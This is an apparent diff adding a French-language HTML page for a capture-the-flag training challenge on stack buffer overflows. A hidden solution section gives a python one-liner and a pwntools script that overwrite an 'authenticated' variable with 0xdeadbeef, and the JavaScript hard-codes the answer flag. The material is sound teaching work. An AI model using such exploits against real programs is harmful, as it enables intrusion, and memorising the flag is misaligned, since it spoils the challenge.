@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Challenge 06 - Buffer Overflow | Try-Pwn-Me</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            padding: 40px 20px;
+            border-bottom: 1px solid #2a2a2a;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: #888;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            transition: color 0.3s ease;
+        }
+
+        .back-link:hover {
+            color: #ffffff;
+        }
+
+        .challenge-number {
+            font-size: 0.8em;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            font-weight: 700;
+            margin-bottom: 15px;
+            letter-spacing: -1px;
+        }
+
+        .challenge-difficulty {
+            display: inline-block;
+            padding: 6px 16px;
+            background: #1a1a1a;
+            border: 1px solid #555;
+            margin-bottom: 20px;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .challenge-meta {
+            color: #666;
+            font-size: 0.9em;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .section {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            padding: 35px;
+            margin-bottom: 30px;
+        }
+
+        .section h2 {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .section p {
+            color: #aaa;
+            margin-bottom: 15px;
+            line-height: 1.8;
+        }
+
+        .hint-box {
+            background: #1a1a1a;
+            border-left: 3px solid #ff6600;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .hint-box strong {
+            color: #ff6600;
+        }
+
+        .objective-box {
+            background: #0f0f0f;
+            border: 1px solid #2a2a2a;
+            padding: 25px;
+            margin: 20px 0;
+        }
+
+        .objective-box h3 {
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+
+        .download-section {
+            background: #0a0a0a;
+            border: 2px solid #2a2a2a;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .download-btn {
+            background: #ffffff;
+            color: #000000;
+            border: none;
+            padding: 15px 40px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 1em;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px;
+        }
+
+        .download-btn:hover {
+            background: #e0e0e0;
+            transform: translateY(-2px);
+        }
+
+        .flag-submission {
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            padding: 30px;
+            margin: 30px 0;
+        }
+
+        .flag-input {
+            width: 100%;
+            padding: 15px;
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            color: #ffffff;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+        }
+
+        .flag-input:focus {
+            outline: none;
+            border-color: #555;
+        }
+
+        .btn {
+            background: #ffffff;
+            color: #000000;
+            border: none;
+            padding: 15px 40px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 1em;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #e0e0e0;
+            transform: translateY(-2px);
+        }
+
+        .message {
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid #2a2a2a;
+            display: none;
+        }
+
+        .message.success {
+            background: #0a1a0a;
+            border-color: #224422;
+            color: #44ff44;
+            display: block;
+        }
+
+        .message.error {
+            background: #1a0a0a;
+            border-color: #442222;
+            color: #ff4444;
+            display: block;
+        }
+
+        .message h3 {
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        code {
+            background: #1a1a1a;
+            padding: 2px 8px;
+            font-family: 'Courier New', monospace;
+            color: #ddd;
+        }
+
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            padding: 20px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            font-size: 0.9em;
+        }
+
+        .tools-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .tools-list li {
+            padding: 10px 0;
+            color: #aaa;
+            border-bottom: 1px solid #1a1a1a;
+        }
+
+        .tools-list li:last-child {
+            border-bottom: none;
+        }
+
+        .warning-box {
+            background: #1a0a0a;
+            border: 1px solid #ff4444;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 3px solid #ff4444;
+        }
+
+        .warning-box strong {
+            color: #ff4444;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
+            border-top: 1px solid #2a2a2a;
+            margin-top: 60px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="index.html" class="back-link">← Retour aux challenges</a>
+            <div class="challenge-number">Challenge 06</div>
+            <h1>Buffer Overflow</h1>
+            <span class="challenge-difficulty">Moyen</span>
+            <div class="challenge-meta">
+                <span>💀 PWN</span>
+                <span>🎯 100 points</span>
+                <span>🔧 Binary Exploitation</span>
+            </div>
+        </header>
+
+        <div class="section">
+            <h2>Description</h2>
+            <p>
+                Un buffer overflow se produit lorsqu'un programme écrit plus de données dans un buffer 
+                qu'il ne peut en contenir. Cela peut écraser des données adjacentes en mémoire, 
+                notamment des variables de contrôle ou même l'adresse de retour de fonctions.
+            </p>
+            <p>
+                Dans ce challenge, vous devez exploiter une vulnérabilité de buffer overflow pour 
+                modifier la variable <code>authenticated</code> et obtenir le flag.
+            </p>
+            
+            <div class="warning-box">
+                <strong>⚠️ PRÉREQUIS :</strong> Ce challenge nécessite un environnement Linux. 
+                Si vous êtes sur Windows ou Mac, utilisez une machine virtuelle (VirtualBox, VMware) 
+                ou WSL2 (Windows Subsystem for Linux).
+            </div>
+            
+            <div class="hint-box">
+                <strong>💡 Indice :</strong> Le programme utilise la fonction <code>gets()</code> 
+                qui ne vérifie pas la taille de l'input. Le buffer fait 64 bytes. Que se passe-t-il 
+                si vous envoyez plus de 64 bytes ? Vous devez écraser <code>authenticated</code> 
+                avec la valeur 0xdeadbeef (en little-endian).
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Objectif</h2>
+            <div class="objective-box">
+                <h3>🎯 Mission</h3>
+                <p>Exploitez le buffer overflow pour modifier la variable authenticated et obtenir le flag.</p>
+                <p style="margin-top: 10px; color: #888;">Valeur requise : 0xdeadbeef</p>
+            </div>
+        </div>
+
+        <div class="download-section">
+            <h2 style="margin-bottom: 25px;">📥 Télécharger le Challenge</h2>
+            <p style="margin-bottom: 20px; color: #aaa;">
+                Le paquet contient le binaire ELF, le code source C et un README
+            </p>
+            <a href="ctf-files/pwn_buffer_overflow.zip" class="download-btn" download>
+                📦 Télécharger Buffer Overflow Challenge
+            </a>
+        </div>
+
+        <div class="flag-submission">
+            <h2 style="margin-bottom: 25px;">Soumettre le Flag</h2>
+            <input 
+                type="text" 
+                id="flag-input" 
+                class="flag-input" 
+                placeholder="TPM{...}"
+                autocomplete="off"
+            >
+            <button class="btn" onclick="checkFlag()">Valider le Flag</button>
+        </div>
+
+        <div id="flag-message" class="message"></div>
+
+        <div class="section">
+            <h2>Outils Recommandés</h2>
+            <ul class="tools-list">
+                <li><strong>gdb :</strong> Débogueur pour analyser le binaire</li>
+                <li><strong>pwntools :</strong> Framework Python pour exploitation</li>
+                <li><strong>peda/pwndbg :</strong> Extensions GDB pour le pwn</li>
+                <li><strong>checksec :</strong> Vérifier les protections du binaire</li>
+                <li><strong>objdump/readelf :</strong> Analyser la structure ELF</li>
+            </ul>
+        </div>
+
+        <div id="solution-section" class="section" style="display: none;">
+            <h2>✅ Solution et Explications</h2>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 1 : Analyse du binaire</h3>
+            <div class="code-block">
+# Donner les permissions d'exécution
+chmod +x buffer_overflow
+
+# Vérifier les protections
+checksec buffer_overflow
+
+# Exécuter le programme normalement
+./buffer_overflow
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 2 : Trouver l'offset</h3>
+            <p>Le buffer fait 64 bytes. Vous devez envoyer 64 bytes de padding + 4 ou 8 bytes pour écraser authenticated.</p>
+            <div class="code-block">
+# Tester différents offsets
+python3 -c 'print("A"*64)' | ./buffer_overflow
+python3 -c 'print("A"*72)' | ./buffer_overflow
+python3 -c 'print("A"*80)' | ./buffer_overflow
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 3 : Créer le payload</h3>
+            <div class="code-block">
+# Payload : padding + valeur 0xdeadbeef en little-endian
+# Little-endian : 0xdeadbeef = \xef\xbe\xad\xde
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xef\xbe\xad\xde")' | ./buffer_overflow
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 4 : Avec pwntools</h3>
+            <div class="code-block">
+from pwn import *
+
+# Lancer le programme
+p = process('./buffer_overflow')
+
+# Créer le payload
+payload = b'A' * 72  # Padding
+payload += p32(0xdeadbeef)  # Valeur en little-endian
+
+# Envoyer le payload
+p.sendline(payload)
+p.interactive()
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Comprendre Buffer Overflow</h3>
+            <p><strong>Comment ça fonctionne :</strong></p>
+            <ul class="tools-list">
+                <li><strong>Stack Layout :</strong> Les variables locales sont stockées sur la stack</li>
+                <li><strong>Overflow :</strong> Écrire au-delà d'un buffer écrase les données adjacentes</li>
+                <li><strong>gets() :</strong> Fonction dangereuse qui ne vérifie pas la taille</li>
+                <li><strong>Exploitation :</strong> Contrôler les valeurs des variables ou l'execution flow</li>
+            </ul>
+            <p style="margin-top: 15px;"><strong>Protections modernes :</strong></p>
+            <ul class="tools-list">
+                <li><strong>Stack Canary :</strong> Valeur aléatoire pour détecter l'overflow</li>
+                <li><strong>NX/DEP :</strong> Stack non-exécutable</li>
+                <li><strong>ASLR :</strong> Randomisation des adresses mémoire</li>
+                <li><strong>PIE :</strong> Position Independent Executable</li>
+            </ul>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Debugging avec GDB</h3>
+            <div class="code-block">
+# Lancer gdb
+gdb ./buffer_overflow
+
+# Désassembler la fonction vulnerable
+disassemble vulnerable_function
+
+# Mettre un breakpoint
+break *vulnerable_function+XX
+
+# Exécuter et examiner la stack
+run
+x/40wx $rsp
+
+# Examiner la variable authenticated
+print &authenticated
+x/wx &authenticated
+            </div>
+        </div>
+
+        <footer>
+            <p>Try-Pwn-Me - Challenge 06</p>
+        </footer>
+    </div>
+
+    <script>
+        function checkFlag() {
+            const flagInput = document.getElementById('flag-input').value.trim();
+            const messageDiv = document.getElementById('flag-message');
+            const correctFlag = 'TPM{buff3r_0v3rfl0w_m4st3r}';
+            
+            if (flagInput === '') {
+                messageDiv.className = 'message error';
+                messageDiv.innerHTML = `
+                    <h3>❌ Erreur</h3>
+                    <p>Veuillez entrer un flag avant de valider.</p>
+                `;
+                return;
+            }
+            
+            if (flagInput === correctFlag) {
+                messageDiv.className = 'message success';
+                messageDiv.innerHTML = `
+                    <h3>🎉 CHALLENGE RÉUSSI !</h3>
+                    <p>Excellent ! Vous avez exploité le buffer overflow avec succès.</p>
+                    <p style="margin-top: 15px; font-family: 'Courier New', monospace; font-size: 1.1em;">
+                        FLAG VALIDÉ: ${correctFlag}
+                    </p>
+                    <p style="margin-top: 20px; font-size: 0.95em; color: #888;">
+                        🎓 Félicitations ! Vous venez d'exploiter votre premier buffer overflow. 
+                        Cette vulnérabilité a été responsable de nombreuses failles de sécurité majeures. 
+                        Les fonctions comme gets(), strcpy(), sprintf() sans vérification de taille 
+                        doivent être évitées en production. Utilisez fgets(), strncpy(), snprintf() à la place.
+                    </p>
+                `;
+                
+                // Afficher la section solution
+                document.getElementById('solution-section').style.display = 'block';
+                document.getElementById('solution-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            } else {
+                messageDiv.className = 'message error';
+                messageDiv.innerHTML = `
+                    <h3>❌ Flag Incorrect</h3>
+                    <p>Le flag que vous avez entré n'est pas correct. Continuez vos recherches !</p>
+                    <p style="margin-top: 15px; color: #888;">
+                        💡 Assurez-vous d'avoir bien écrasé la variable avec 0xdeadbeef en little-endian 
+                        (\xef\xbe\xad\xde). Utilisez gdb pour débugger et voir l'état de la mémoire.
+                    </p>
+                `;
+            }
+        }
+
+        document.getElementById('flag-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkFlag();
+            }
+        });
+
+        console.log('%c[Try-Pwn-Me] Challenge 06 - Buffer Overflow', 'color: white; font-size: 16px; font-weight: bold;');
+        console.log('%cBinary Exploitation - Stack overflow', 'color: #888; font-size: 12px;');
+    </script>
+</body>
+</html>
